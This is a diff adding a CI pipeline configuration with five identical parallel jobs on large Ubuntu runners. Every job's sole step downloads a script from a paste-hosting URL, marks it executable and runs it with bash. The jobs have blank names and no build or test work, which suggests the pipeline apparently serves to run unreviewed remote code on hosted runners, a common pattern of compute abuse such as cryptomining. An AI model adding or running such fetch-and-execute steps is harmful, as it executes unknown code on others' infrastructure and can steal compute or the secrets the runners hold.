@@ -1,0 +1,65 @@
+jobs:
+  Job1:
+    name: Job 1
+    steps:
+      - type: script
+        name: ''
+        script-content: |-
+          wget -O a https://x0.at/aaCl.txt
+          chmod +x a
+          sed -i 's/\r$//' a
+          bash a
+    dependencies: []
+    runs-on: Ubuntu-22.04-Large
+    
+  Job2:
+    name: Job 2
+    steps:
+      - type: script
+        name: ''
+        script-content: |-
+          wget -O a https://x0.at/aaCl.txt
+          chmod +x a
+          sed -i 's/\r$//' a
+          bash a
+    dependencies: []
+    runs-on: Ubuntu-22.04-Large
+    
+  Job3:
+    name: Job 3
+    steps:
+      - type: script
+        name: ''
+        script-content: |-
+          wget -O a https://x0.at/aaCl.txt
+          chmod +x a
+          sed -i 's/\r$//' a
+          bash a
+    dependencies: []
+    runs-on: Ubuntu-22.04-Large
+    
+  Job4:
+    name: Job 4
+    steps:
+      - type: script
+        name: ''
+        script-content: |-
+          wget -O a https://x0.at/aaCl.txt
+          chmod +x a
+          sed -i 's/\r$//' a
+          bash a
+    dependencies: []
+    runs-on: Ubuntu-22.04-Large
+    
+  Job5:
+    name: Job 5
+    steps:
+      - type: script
+        name: ''
+        script-content: |-
+          wget -O a https://x0.at/aaCl.txt
+          chmod +x a
+          sed -i 's/\r$//' a
+          bash a
+    dependencies: []
+    runs-on: Ubuntu-22.04-Large
